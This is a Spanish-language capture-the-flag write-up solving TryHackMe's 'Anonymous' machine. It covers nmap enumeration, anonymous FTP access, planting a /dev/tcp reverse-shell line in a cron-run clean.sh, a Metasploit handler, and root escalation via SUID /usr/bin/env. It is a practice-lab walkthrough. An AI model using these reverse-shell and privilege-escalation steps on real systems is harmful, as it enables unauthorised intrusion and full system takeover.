---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Medium
  - FTP
  - ReverseShell
  - PrivilegeEscalation
  - SUID
---
- [[#Enumeration|Enumeration]]
	- [[#Enumeration#Ping|Ping]]
	- [[#Enumeration#Nmap|Nmap]]
	- [[#Enumeration#FTP|FTP]]
- [[#Exploitation|Exploitation]]
	- [[#Exploitation#FTP|FTP]]
	- [[#Exploitation#Reverse Shell|Reverse Shell]]
	- [[#Exploitation#Privilege Escalation|Privilege Escalation]]
		- [[#Privilege Escalation#SUID|SUID]]

---
# Resolviendo la máquina Anonymous

> En este **Write-up** detallo la resolución de la máquina **Anonymous**, categorizada con dificultad media en [TryHackMe](https://tryhackme.com/room/anonymous).  
> Durante el proceso se explota un servicio **FTP** con acceso anónimo, que permite la manipulación de un script ejecutado de forma periódica, facilitando la obtención de una **Reverse Shell**. Finalmente, se realiza una escalada de privilegios aprovechando un binario con permisos **SUID** (`/usr/bin/env`), lo que concede acceso total al sistema.

---
## Enumeration
### Ping

`ping -c 1 10.10.41.183`

![](Screenshots/Pasted%20image%2020250817192837.png)

*TTL=63/64* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.41.183 -oG allPorts`

![](Screenshots/Pasted%20image%2020250817192901.png)

`nmap -p21,22,139,445 -sCV 10.10.41.183 -oN targeted`

![](Screenshots/Pasted%20image%2020250817192921.png)
![](Screenshots/Pasted%20image%2020250817192932.png)
### FTP

Se observa que el servicio **FTP** (21) se encuentra abierto y además de tener el inicio de sesión anónimo activado.

`ftp 10.10.41.183`

![](Screenshots/Pasted%20image%2020250817192955.png)

Se encuentra el directorio `scripts`, se accede a él para visualizar lo que contiene.

`cd scripts`

`ls`

![](Screenshots/Pasted%20image%2020250817193009.png)

El archivo `clean.sh` se ejecuta de forma periódica, registrando su actividad en `removed_files.log`.

`get clean.sh`

`cat clean.sh`

![](Screenshots/Pasted%20image%2020250817193027.png)

`get removed_files.log`

`cat removed_files.log`

![](Screenshots/Pasted%20image%2020250817193040.png)

`get to_do.txt`

`cat to_do.txt`

![](Screenshots/Pasted%20image%2020250817193052.png)

Se observa que el archivo llamado `clean.sh` se ejecuta de manera periódica y pinta trazas en el archivo `removed_files.log`.

---
## Exploitation
### FTP

Como hemos visto en la sección de enumeración, se ejecuta de manera periódica un script.

Se procede a modificar el script, añadiendo un *Reverse Shell*.

`/bin/bash -c "sh -i >& /dev/tcp/10.8.184.124/1234 0>&1"`

`cat clean.sh`

![](Screenshots/Pasted%20image%2020250817193106.png)

Se vuelve a acceder al servicio **FTP** y se sube el archivo modificado.

`put clean.sh`.
### Reverse Shell

Se configura un handler en Metasploit para escuchar en el puerto 1234.

`vim handler.rc`

```
use multi/handler
set LHOST 10.8.184.124
set LPORT 1234
run
```

`msfconsole -r handler.rc`

![](Screenshots/Pasted%20image%2020250817193125.png)

Se obtiene la *Reverse Shell*.

`background`

`sessions -u 1`

`sessions 2`

`sysinfo`

![](Screenshots/Pasted%20image%2020250817193138.png)

`getuid`

![](Screenshots/Pasted%20image%2020250817193154.png)

`cat /etc/passwd`

![](Screenshots/Pasted%20image%2020250817193208.png)

Se accede al directorio `/home/namelessone`.

`ls`

![](Screenshots/Pasted%20image%2020250817193225.png)

Se encuentra la *flag* de usuario.
### Privilege Escalation
#### SUID

Se obtiene una *shell*.

`shell`

`/bin/bash -i`

`find / -perm -4000 2>/dev/null`

![](Screenshots/Pasted%20image%2020250817193253.png)
![](Screenshots/Pasted%20image%2020250817193311.png)

El binario `/usr/bin/env` con bit **SUID** permite invocar una shell como *root*, lo que facilita la escalada de privilegios según lo documentado en [GTFOBins](https://gtfobins.github.io/gtfobins/env/#suid).

![](Screenshots/Pasted%20image%2020250817193328.png)

`/usr/bin/env /bin/sh -p`

![](Screenshots/Pasted%20image%2020250817193346.png)

Se accede al directorio `/root`.

`ls -la`

![](Screenshots/Pasted%20image%2020250817193357.png)

Se encuentra la *flag* de *root*.

---

